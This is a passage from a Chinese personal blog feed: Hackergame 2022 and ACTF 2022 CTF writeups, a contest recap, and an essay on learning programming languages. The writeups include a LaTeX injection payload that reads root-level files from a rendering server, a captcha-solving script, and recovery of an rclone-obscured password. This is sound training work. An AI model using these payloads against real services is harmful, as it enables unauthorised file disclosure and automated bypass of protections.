= ftp.example.com</span><br><span class="line"><span class="attr">user</span> = user</span><br><span class="line"><span class="attr">pass</span> = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-<span class="number">5</span>DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ</span><br></pre></td></tr></table></figure><p>没用过 rclone，自己装了一个试了一下，发现 pass 是混淆后的，而且是随机的，有一个命令 rclone obscure 可以用来混淆密码。文档里也说了混淆的目的也只是防止有人可以一眼看到密码而已，并没有加密，rclone 是可以直接复原明文的。于是就翻了下 rclone 源码，可以在 obscure <a href="https://github.com/rclone/rclone/blob/master/fs/config/obscure/obscure.go">相关源码</a> 里找到恢复相关的函数 Reveal，复制下来跑一下给出的 pass 即可以恢复密码，即：<strong>flag{get_rclone_password_from_config!_……}</strong></p><hr><h2 id="HeiLang"><a href="#HeiLang" class="headerlink" title="HeiLang"></a>HeiLang</h2><blockquote><p>来自 Heicore 社区的新一代编程语言 HeiLang，基于第三代大蟒蛇语言，但是抛弃了原有的难以理解的 | 运算，升级为了更加先进的语法，用 A[x | y | z] = t 来表示之前复杂的 A[x] = t; A[y] = t; A[z] = t。</p><p>作为一个编程爱好者，我觉得实在是太酷了，很符合我对未来编程语言的想象，科技并带着趣味。</p></blockquote><p>题给了一个以这种语法写的生成数组的代码，以及验证结果的 python 代码。其实题目已经说的很明确了，不过懒得写，记得 GitHub 上看到过一个项目 <a href="https://github.com/kifuan/helang/">HeLang</a>，不过里面的数组下标从 1 开始，所以就写了段代码来将 [] 中的数都加一，跑一遍输出数组 a，然后替代原来文件里的部分，跑一下就可以拿到 flag：<strong>flag{6d9ad6e9a6268d96-97091f6fffb6935c}</strong></p><hr><h2 id="Xcaptcha"><a href="#Xcaptcha" class="headerlink" title="Xcaptcha"></a>Xcaptcha</h2><blockquote><p><del>题目太长了，省略了部分背景故事</del></p><p>众人目目相觑。</p><p>「我来试试。」，一名队员上前点击了按钮。然后，屏幕显示「请在一秒内完成以下加法计算」。</p><p>还没等反应过来，屏幕上的字又开始变幻，显示着「验证失败」。而你作为突击队中唯一的黑客，全村人民最后的希望，迎着纷纷投来的目光，能否在规定时间内完成验证，打开机房，不，推开和平时代的大门？</p></blockquote><p>大概就是点击认证后在一秒内计算三个大整数加法然后提交。手快存一份 html，按照其中要求正则一下提取出算式然后做加法再 post 回去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, requests</span><br><span class="line">url = <span class="string">&quot;http://202.38.93.111:10047/xcaptcha&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">s.get(<span class="string">&quot;http://202.38.93.111:10047/?token=……&quot;</span>)</span><br><span class="line">res = re.findall(<span class="string">r&quot;&gt;(\d*?)\+(\d*?) &quot;</span>, s.get(url).text)</span><br><span class="line"><span class="built_in">print</span>(s.post(url, data=&#123;<span class="string">f&#x27;captcha<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&#x27;</span>: <span class="built_in">str</span>(<span class="built_in">int</span>(res[i][<span class="number">0</span>]) + <span class="built_in">int</span>(res[i][<span class="number">1</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)&#125;).text)</span><br></pre></td></tr></table></figure><p>（<del>经典压行</del>）跑一下拿到 flag：<strong>flag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_……}</strong></p><hr><h2 id="LaTeX-机器人"><a href="#LaTeX-机器人" class="headerlink" title="LaTeX 机器人"></a>LaTeX 机器人</h2><blockquote><p>在网上社交群组中交流数学和物理问题时，总是免不了输入公式。而显然大多数常用的聊天软件并不能做到这一点。为了方便大家在水群和卖弱之余能够高效地进行学术交流，G 社的同学制作了一个简单易用的将 LaTeX 公式代码转换成图片的网站，并通过聊天机器人在群里实时将群友发送的公式转换成图片发出。</p><p>这个网站的思路也很直接：把用户输入的 LaTeX 插入到一个写好头部和尾部的 TeX 文件中，将文件编译成 PDF，再将 PDF 裁剪成大小合适的图片。</p><p>“LaTeX 又不是被编译执行的代码，这种东西不会有事的。”</p><p>物理出身的开发者们明显不是太在意这个网站的安全问题，也没有对用户的输入做任何检查。</p><p>那你能想办法获得服务器上放在根目录下的 flag 吗？</p><p><strong>纯文本</strong></p><p>第一个 flag 位于 /flag1，flag 花括号内的内容由纯文本组成（即只包含大写小写字母和数字 0-9）。</p><p><strong>特殊字符混入</strong></p><p>第二个 flag 位于 /flag2，这次，flag 花括号内的内容除了字母和数字之外，还混入了两种特殊字符：下划线（_）和井号（#）。你可能需要想些其他办法了。</p></blockquote><p>第一个 flag 很简单，只需要 input 一下即可：<code>\input&#123;/flag1&#125;</code>，可以看到 flag：**flag{becAr3fu11dUd3……}**。</p><p>第二个 flag 因为里面包含特殊字符，所以在渲染的时候会出现错误。解决方案是利用 <a href="https://www.latexstudio.net/archives/10883.html">LaTeX 的 active character 概念</a>来将 _ 和 # 替换为 \_ 和 \#，先将其字符的 catcode 设置为 \active，然后定义命令序列。payload 为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\catcode`\_=\active \def_&#123;\_&#125; \catcode`\#=\active \def#&#123;\#&#125;\input&#123;/flag2&#125;$$</span><br></pre></td></tr></table></figure><p>得到 flag：<strong>flag{latex_bec_0_m##es_co__#ol_……}</strong></p><hr><h2 id="链上记忆大师"><a href="#链上记忆大师" class="headerlink" title="链上记忆大师"></a>链上记忆大师</h2><blockquote><p>听说你在区块链上部署的智能合约有过目不忘的能力。</p></blockquote><p>第一道题题目合约：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity =<span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line">interface MemoryMaster &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">memorize</span>(<span class="params">uint256 n</span>) <span class="title">external</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">recall</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Challenge &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">MemoryMaster m, uint256 n</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        m.memorize(n);</span><br><span class="line">        uint256 recalled = m.recall();</span><br><span class="line">        <span class="keyword">return</span> recalled == n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单，写一个合约存值，实现 memorize 和 recall 方法存取值即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity =<span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    uint256 num;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">memorize</span>(<span class="params">uint256 n</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        num = n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">recall</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Remix 里编译然后上传即可，flag：<strong>flag{Y0u_Ar3_n0w_f4M1l1ar_W1th_S0l1dity_st0rage_……}</strong></p><p>第一题抢了一血。第二三题看了属实蒙圈。第二题在调用 memorize 之后接了一个 revert 恢复状态变化。第三题限定 memorize 方法为 view 函数，即不能修改状态。感觉很神奇，可能是用了某些 EVM 特性吧。蹲 wp 学学。</p><hr><p>接着就开始囤 flag 了，下一篇再写。</p><div style="display: flex; justify-content: space-between;"><p><a href="/p/630bfdd5.html">&lt; #0</a></p><p><a href="/p/4fd94ed.html">#2 &gt;</a></p></div>]]></content>
    
    
    <summary type="html">&lt;div style=&quot;display: flex; justify-content: space-between;&quot;&gt;

&lt;p&gt;&lt;a href=&quot;/p/630bfdd5.html&quot;&gt;&amp;lt; #0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/p/4fd94ed.html&quot;&gt;#2 &amp;gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;这篇 Writeup 写一下 Hackergame 2022 里刚开局时做的一些简单题：&lt;br&gt;签到、猫咪问答喵、家目录里的秘密、HeiLang、Xcaptcha、LaTeX 机器人、链上记忆大师&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>「Hackergame 2022」#0 赛后总结</title>
    <link href="https://blog.tonycrane.cc/p/630bfdd5.html"/>
    <id>https://blog.tonycrane.cc/p/630bfdd5.html</id>
    <published>2022-10-26T20:43:30.000Z</published>
    <updated>2024-08-05T13:52:39.386Z</updated>
    
    <content type="html"><![CDATA[<p>现在是 27 号凌晨四点多，感冒了还失眠了，题已经基本都没有思路了，索性下楼转了转回来写这次不算成功但也很有趣的 hackergame 的赛后总结和 writeup。</p><h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><ul><li><a href="/p/c8afb596.html">「Hackergame 2022」#1 Writup 开局杀题</a><br>  签到、猫咪问答喵、家目录里的秘密、HeiLang、Xcaptcha、LaTeX 机器人、链上记忆大师</li><li><a href="/p/4fd94ed.html">「Hackergame 2022」#2 Writup 囤囤囤 0</a><br>  旅行照片 2.0、猜数字、Flag 的痕迹、安全的在线测评、线路板、Flag 自动机、杯窗鹅影</li><li><a href="/p/169d9f3d.html">「Hackergame 2022」#3 Writup 囤囤囤 1</a><br>  微积分计算小练习、蒙特卡罗轮盘赌、二次元神经网络、光与影、片上系统、企鹅拼盘、火眼金睛的小 E</li></ul><span id="more"></span><h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><ul><li><a href="/p/c05d7b7c.html">「Hackergame 2021」#0 赛后总结</a></li><li><a href="https://note.tonycrane.cc/writeups/hackergame2022/">notebook 版 Hackergame 2022 Writeup</a></li></ul><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Hackergame 也算是我的 CTF 启蒙比赛了，去年 GZTime 叫我来打的，成绩也不错，直接通过纳新加入了 AAA 战队。跟着队伍打了一年 CTF 之后再回来打了一场 hackergame，也算是一周年纪念了。</p><p>今年的时间正好接在了校赛后面，忙完校赛的事情就来打了，也临近期中了，ddl 一大堆，只好硬抽些时间打比赛。</p><p>这次为了防止对校内榜产生影响，就没以浙大组内身份报名（其实是效仿去年 GZTime）结果今年纳新主力在校赛上，hackergame 打的人倒是很少，也有几个队员报了校内身份，<del>早知道我也报了好了</del>（<del>报了还能看一眼垂直上分的图</del>）。</p><p>开赛的时候也没什么事，就蹲了一波，抢了两个一血，做了几道题。然后就打算进行一个囤 flag 的行为，慢慢一天天地做题，囤了 17 个 flag。26 号上午（还有三天结束）觉得没什么题能做出来了，就全交了。当时排了 30 名，然后基本就是看着排名往下掉，一直掉到八十。</p><p><img src="/p/630bfdd5/30.jpg"><br><img src="/p/630bfdd5/final.png"></p><p>想想去年总分 4200，拿了总 22 名，还是很不甘心的。不过确实没有题可以做了，只能感叹一句技不如人。</p><p>相比去年，这次的 binary 和 math 题感觉多了不少，都是我不会甚至没接触过的东西。math 就做了纯暴力的几道题，binary 也就做了几道简单甚至有点像 misc 的题。剩下的题嘛……就感觉<del>安全得很</del>能做出来都是很神奇的。</p><p>不过相较去年或许还是有些进步的，比如说区块链从去年挣扎瞎鼓捣一天也没做出一题到今年抢了个简单的一血（虽然说区块链也只做出来了这一道题www），比如说 general+web（感觉其实就是 misc）除了 OJ 题第二问、区块链二三问和一道不知道干啥的 web 题之外都做出来了。</p><p>接下来的一年嘛……多向队内大手子学学 rev/pwn，<del>争取明年多做出几道 binary</del>（math/crypto 对于我这数理基础极不扎实的人说还是算了吧（摊</p><p>体验……也不知道算不算良好，反正下次再来 _(:з」∠)_</p><hr><p style="font-size: x-small; text-align: right;">声明：虽然总结和 Writeup 的创建时间在比赛结束前，但均在比赛结束后才发布到互联网</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;现在是 27 号凌晨四点多，感冒了还失眠了，题已经基本都没有思路了，索性下楼转了转回来写这次不算成功但也很有趣的 hackergame 的赛后总结和 writeup。&lt;/p&gt;
&lt;h2 id=&quot;Writeup&quot;&gt;&lt;a href=&quot;#Writeup&quot; class=&quot;headerlink&quot; title=&quot;Writeup&quot;&gt;&lt;/a&gt;Writeup&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;/p/c8afb596.html&quot;&gt;「Hackergame 2022」#1 Writup 开局杀题&lt;/a&gt;&lt;br&gt;  签到、猫咪问答喵、家目录里的秘密、HeiLang、Xcaptcha、LaTeX 机器人、链上记忆大师&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/p/4fd94ed.html&quot;&gt;「Hackergame 2022」#2 Writup 囤囤囤 0&lt;/a&gt;&lt;br&gt;  旅行照片 2.0、猜数字、Flag 的痕迹、安全的在线测评、线路板、Flag 自动机、杯窗鹅影&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/p/169d9f3d.html&quot;&gt;「Hackergame 2022」#3 Writup 囤囤囤 1&lt;/a&gt;&lt;br&gt;  微积分计算小练习、蒙特卡罗轮盘赌、二次元神经网络、光与影、片上系统、企鹅拼盘、火眼金睛的小 E&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>「杂谈」我与几门编程语言之间的故事</title>
    <link href="https://blog.tonycrane.cc/p/293d7afe.html"/>
    <id>https://blog.tonycrane.cc/p/293d7afe.html</id>
    <published>2022-09-03T15:24:23.000Z</published>
    <updated>2022-10-26T20:46:35.456Z</updated>
    
    <content type="html"><![CDATA[<p>第二次学完 Rust 基础之后没事闲的来写篇博客讲讲故事</p><p>本来想只写 Rust 来着，想了想又觉得其它语言不说也不好，干脆都写下来吧（</p><span id="more"></span><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="初识-学习"><a href="#初识-学习" class="headerlink" title="初识 / 学习"></a>初识 / 学习</h3><p>应该是接触的第一门语言了，之前在 <a href="/p/6222a56.html">与 manim 之间的往事</a> 这篇文章里也讲过，初中通过 3Blue1Brown 的视频了解到了 manim 引擎，进而认识到了 python 这门语言</p><p>由于了解 manim 的时候已经临近中考了，就没再深入研究。考后凭借着对于 manim 的向往开始学习了 python。买了《Python 编程：从入门到实践》这本书（算是我的代码启蒙书了，所以我总是到处推荐这本书 2333），当时甚至手写记笔记，记了半本</p><p>还记得当时假期上物竞数竞培训课，而课前我一直在看 python 书 2333。当时家里可能也觉得挺新奇的，一直喜欢数理化的孩子怎么突然鼓捣上编程了。当时我也没想到我之后会走上这条道路 _(:з」∠)_</p><p>看完了那本书基本上就快要开学了，也没写多少代码（印象中好像就照着教程给奶奶写了一个爆搜解数独的程序？）manim 试图看了看，看不懂，而且还没装上。开学之后选了信息竞赛，开始学了 C/C++，有一段时间没接触 python 了</p><h3 id="熟悉-深入"><a href="#熟悉-深入" class="headerlink" title="熟悉 / 深入"></a>熟悉 / 深入</h3><p>明确了要打信息竞赛之后，下午总是呆在机房，空闲时间自然很多。又学了学 LaTeX，鼓捣着学了点计算机基础知识，把 manim 装成了，还做了一些视频。</p><p>视频做着做着代码也越写越多，不会的时候也开始从搜百度到搜 issue 再到直接搜源码，对 manim 也越来越熟悉了。大概是高二上学期期末考试后，我打算开始看一看 manim 源码，那段时间正好是学校竞赛班假期上课，就打印了一部分核心源码带到学校没事的时候看一看（当时还并不是很能看懂）</p><p>也正是那个假期，刚春节放完假，我也刚完成 FFT 那期视频，即将重新回学校上课，这时疫情爆发，居家上网课，一上就是半年，这半年网课着实没少摸鱼，总是在空闲的时候或者偷偷摸摸地玩一玩 manim，也有了时间从入口点开始一点一点扣源码。逐渐整个框架就变得清晰了，也从中学到了很多用法</p><p>这之后买了第二本书也就是《流畅的 Python》，里面讲了很多“高级”的用法，收获很大。到了高三，变成了 manim 的 collaborator，也在使用 python 上越来越深了</p><h3 id="一些看法"><a href="#一些看法" class="headerlink" title="一些看法"></a>一些看法</h3><p>Python 确实是一门非常方便、写起来非常自然的语言。直到现在仍在日常使用，随手打开 python 交互窗口算点东西啊什么的。</p><p>感觉 python 达到了一个很好的平衡，初学可以很简单，很容易上手，而想要深入学习的话又确实有很多内容可以探索。虽然日常被吐槽运行效率低，但是可以大大缩短编写代码的时间，有了目标直接上手开写就好了。而且第三方库非常多，有些需求调库就完事了。</p><p>总而言之，在不追求效率和安全的情况下，python 在我心里几乎是完美的</p><h2 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h2><p>感觉……没什么好说的（x</p><p>高中打信息竞赛一定要用的，学也就是看的算法竞赛入门书籍学的，基本上是能用就行（不像大学后认识的贺老师一样看了一大堆 C++ 的书籍）</p><p>没写过什么项目，没有什么特殊感情，不是很喜欢这门语言。不说深入的东西，单从表面上看就让我觉得很难看很难用。单文件还算可以，多文件还要整什么头文件、还要考虑怎么编译，就很烦。以及没有像 pip 之于 python 的这种包管理器，想用第三方库也很烦（实际上我基本没用过）</p><p>总而言之就是很不喜欢了 _(:з」∠)_</p><h2 id="Haskell"><a href="#Haskell" class="headerlink" title="Haskell"></a>Haskell</h2><p>高考结束后的暑假凭借着对函数式语言的好奇学了学（以及当时 pdcxs 转载了许多 haskell 相关的视频，还有感觉 reanimate 项目挺好玩的，想看一看）</p><p>基本上看了大半个假期，笔记在<a href="/p/b3ca5c18.html">这个博客</a>以及 <a href="https://note.tonycrane.cc/cs/pl/haskell/">notebook</a> 里都有</p><p>怎么说呢，确实很好玩，但是我不会用这个语言来写一些项目什么的。也就是学一学看一看玩一玩的程度吧。</p><p>学的并不很深入，但基本也就止步了。因为是函数式语言，和其他语言也没什么可比的。倒是之后可以再看一看其它的函数式语言玩一玩（<del>咕咕咕</del>）</p><h2 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h2><p>本文重点属于是（<del>为了这盘醋包的饺子</del></p><h3 id="第一次学"><a href="#第一次学" class="headerlink" title="第一次学"></a>第一次学</h3><p>那个暑假基本上看完了 Haskell 之后，到开学又有一段距离，感觉不如再学点别的。问了问 GZ，他推荐了 Rust（他当时也在学）以及 C#（他很熟悉很喜欢）。GZ 给了很多 C# 还有 .Net 的资料，结果最后意识到我一直在用 mac 很多东西用着并不如在微软自家产品上自如，故放弃。所以就来看了看 Rust</p><p>第一感觉，生态很好，文档很齐全，甚至有官方的学习路线以及官方书籍。所以看的官方的那本书（其实是翻译版）学了下</p><p>第一次接触到了很多奇怪的概念，所有权、借用、生命周期、特征、智能指针…… 当时的我甚至连计算机的栈和堆都不太了解，硬着头皮看的。开学前基本上看完了那本书，不过从生命周期开始基本上就全程掉线了</p><p>后来刷完了 rustling，不过基本都是边搜边做，有些代码也是过得不明不白，而且一些深入用法当时并没有对应题目。虽然糊完了，但感觉并没有记住很多（不过 rustling 这种练习模式我是很喜欢的，以及真的很能突出“编译器是你最好的老师”这一个特点）</p><p>但是当时就已学的内容来看，已经能够体会到 rust 社区的用心良苦了。一些写法和设计很符合我的口味，打算以后有时间再看了</p><h3 id="第二次学"><a href="#第二次学" class="headerlink" title="第二次学"></a>第二次学</h3><p>暑假看完之后一整年基本上都没有再碰过 rust，之前学过的东西都忘得一干二净（甚至类型都记不太清了 2333）</p><p>这一年期间看了好多好多 rust 项目，意识到了很多在用的、很喜欢的命令行小工具是用 rust 写的，以及围观了 GZ 用 rust 写 GGOS，两个大二学长用 rust 写操作系统参加比赛，观望编译原理课大三学长用 rust 写自造语言的编译器。总之就是很羡慕（x</p><p>暑假（又是暑假）在家呆着没事就掏出了之前 star 的一堆 rust 资料。开始看了《rust 圣经》，也就是 <a href="https://course.rs/">course.rs</a>，这本书真的是很全面，而且作者写的很通顺（不像之前看的生硬的翻译版）后来确实是看上瘾了，超算小学期的 lab 一直拖着不管，就只想学 rust</p><p>一年之后我又了更多的基础，更容易理解 rust 这些语法、这些要求的意图，学得很通畅。也记了一份笔记，在 <a href="https://note.tonycrane.cc/cs/pl/rust/basic/">notebook</a> 上</p><p>但是现在还没细看很多 rust 项目，也没写过多少 rust 代码，感觉没什么评判资格。不过整体上还是很喜欢这门语言的，简单来讲主要有以下这么几点</p><ul><li>性能和安全性方便自然不必说了</li><li>资料充分：官网上就有不同层次的学习资料，有入门教程、有例子、标准库文档、cargo 手册、针对各用途的手册、更全面的参考手册、更深入的秘典、未稳定特性……</li><li>编译器 / clippy：相当智能，不愧是学 rust 最好的老师，很多问题会直接指出甚至给出解决方案</li><li>cargo：一年前我觉得它很多余，如果想要写段代码，编译出个程序，那直接 rustc 不是就够用了吗。但是现在我意识到了 cargo 的好处，管理包相当方便，也提供了很多命令和工具，真正的一家独大（不像 python 近几年除了 pip 之外还有 poetry 等包管理器兴起）</li><li>文档：官方的一堆库文档就不必说了，主要是官方提供了文档工具直接从源码中生成文档，非常方便，也统一了样式。虽然 python 也有工具来生成文档，不过感觉都不太好用，还需要各种配置，比如 Sphinx 的一些写法我也不是很喜欢，而 rust 就没这些烦恼</li><li>……（其实还有好多，懒了不想写了）</li></ul><p>但还是有一些地方是不太喜欢的，比如说多文件和模块的组织，感觉不如 python 自然，两次看到这个地方的时候都很懵逼，翻了一些项目才基本理解。</p><p>接下来的时间就打算多看看官网上的其它资料，多看看项目，多写写代码，争取早日熟练 rust。</p><h2 id="其它语言？"><a href="#其它语言？" class="headerlink" title="其它语言？"></a>其它语言？</h2><p>还有好多语言也都是简单看了看（<del>暴论警告</del>）</p><ul><li>js / php 就用的时候现翻现学</li><li>solidity 在学 blockchain 类题目的时候学了学，感觉很自然，还是比较舒适的</li><li>Java 各种版本，又什么 jdk，一会儿版本号是 8 左右，一会儿又是 1.8 之类的，再一会儿又是什么 16 什么的，望而却步，根本不想学，止于可以跑 mc、玩 processing 的程度（x</li><li>Go 在打 CTF 做题的时候“有幸”读过一些源码，给我的感觉就是太**丑陋了，很多写法都很不喜欢，不想学*2</li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>深夜瞎白话，图一乐</p><p>没搞过啥大项目，没了解多少 pl 理论，说的也都是些简单的看法。（要学的东西还是多啊（摊</p><p>だから，不要停下来啊（指学习</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;第二次学完 Rust 基础之后没事闲的来写篇博客讲讲故事&lt;/p&gt;
&lt;p&gt;本来想只写 Rust 来着，想了想又觉得其它语言不说也不好，干脆都写下来吧（&lt;/p&gt;</summary>
    
    
    
    <category term="生活" scheme="https://blog.tonycrane.cc/categories/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="杂谈" scheme="https://blog.tonycrane.cc/categories/%E7%94%9F%E6%B4%BB/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="Cpp" scheme="https://blog.tonycrane.cc/tags/Cpp/"/>
    
    <category term="Haskell" scheme="https://blog.tonycrane.cc/tags/Haskell/"/>
    
    <category term="Rust" scheme="https://blog.tonycrane.cc/tags/Rust/"/>
    
    <category term="杂谈" scheme="https://blog.tonycrane.cc/tags/%E6%9D%82%E8%B0%88/"/>
    
    <category term="生活" scheme="https://blog.tonycrane.cc/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="随笔" scheme="https://blog.tonycrane.cc/tags/%E9%9A%8F%E7%AC%94/"/>
    
    <category term="Python" scheme="https://blog.tonycrane.cc/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>「ACTF 2022」Broken QRCode Official Writeup</title>
    <link href="https://blog.tonycrane.cc/p/12a2afd2.html"/>
    <id>https://blog.tonycrane.cc/p/12a2afd2.html</id>
    <published>2022-06-28T05:00:08.000Z</published>
    <updated>2024-08-05T13:52:42.261Z</updated>
    
    <content type="html"><![CDATA[<p>6 月 25～27 号我们 AAA 战队承办了一场 ACTF 比赛，我出了 Broken QRCode 这一道题目，这里是 writeup</p><span id="more"></span><details><summary>English Writeup</summary><p>First of all, the challenge has no attachment. Obviously the primary goal is to get the picture. According to the picture uuid recorded by the mirai QQ robot and the official API of QQ images, we can get the url of that picture:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchat.qpic.cn/gchatpic_new/0-0-AA8F922E7A7C88CE82D73F614D8/0</span><br></pre></td></tr></table></figure><p>Then the picture:<br><img src="/p/12a2afd2/qq.jpg"><br>Then from the “Broken” in the title and the information “The QR code generator has bugs, the qrcode it generated can’t be scanned”, and after a simple analysis, you can see the four identifier bits at the beginning of the QR code, the size, and the padding bits in the middle. They are all exposed, so it can be speculated that there is no mask operation (you can also use the first hint “I broke this QR code by just missing a step” to be sure of this)</p><p>Load the picture into <a href="https://merricx.github.io/qrazybox/">qrazybox</a>. Then apply mask and scan it, you can get <a href="https://gist.github.com/TonyCrane/88dba1fb35297fef2b195495447a8a93">https://gist.github.com/TonyCrane/88dba1fb35297fef2b195495447a8a93</a> , which is a hex string of a zip pack. Unpack it, you can get 12 qr codes:</p><p><img src="/p/12a2afd2/qrcodes.png"></p><p>Scanning them, you will get:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">We&#x27;re no strangers to love</span><br><span class="line">You know the rules and so do I</span><br><span class="line">A full commitment&#x27;s what I&#x27;m thinking of</span><br><span class="line">You wouldn&#x27;t get this from any other guy</span><br><span class="line">I just wanna tell you how I&#x27;m feeling</span><br><span class="line">Gotta make you understand</span><br><span class="line">Never gonna give you up</span><br><span class="line">Never gonna let you down</span><br><span class="line">Never gonna run around and desert you</span><br><span class="line">Never gonna make you cry</span><br><span class="line">Never gonna say goodbye</span><br><span class="line">Never gonna tell a lie and hurt you</span><br></pre></td></tr></table></figure><p>After analysis, it can be found that there is an additional data at the end of the first picture:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">410314c795f6b6e30775f5152436f64337d0ec187c229c4d4a44</span><br><span class="line"># to binary</span><br><span class="line">0100000100000011000101001100011110010101111101101011011011100011000001110111010111110101000101010010010000110110111101100100001100110111110100001110110000011000011111000010001010011100010011010100101001000100</span><br></pre></td></tr></table></figure><p>It is not difficult to find out that this is a bit sequence (including identifier, size, data, padding, ecc) of a qr code content. The data it contains is the last part of flag: <code>1Ly_kn0w_QRCod3&#125;</code></p><p>Then the first part of the flag will be obtained from these twelve qr codes</p><p>Through many tools, you can find errors in all of these qr codes. So you can guess that the ecc hide some changed bits. Then you can try to find out which bits are changed.</p><p>The most direct solution is to use the Reed-Solomon codes to find the position of the wrong bits, and then find its place in the qr code. But this is  too complicated.</p><p>Since the content of each QR code is known, the version, error correction level, mask, and encoding method are all known. Then the qr code is uniquely determined. So as long as a correct QR code is generated, then we can find the changed place by diffing them:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qrcode <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageOps, ImageChops</span><br><span class="line"></span><br><span class="line">rick = [</span><br><span class="line">    <span class="string">&quot;We&#x27;re no strangers to love&quot;</span>,</span><br><span class="line">    <span class="string">&quot;You know the rules and so do I&quot;</span>,</span><br><span class="line">    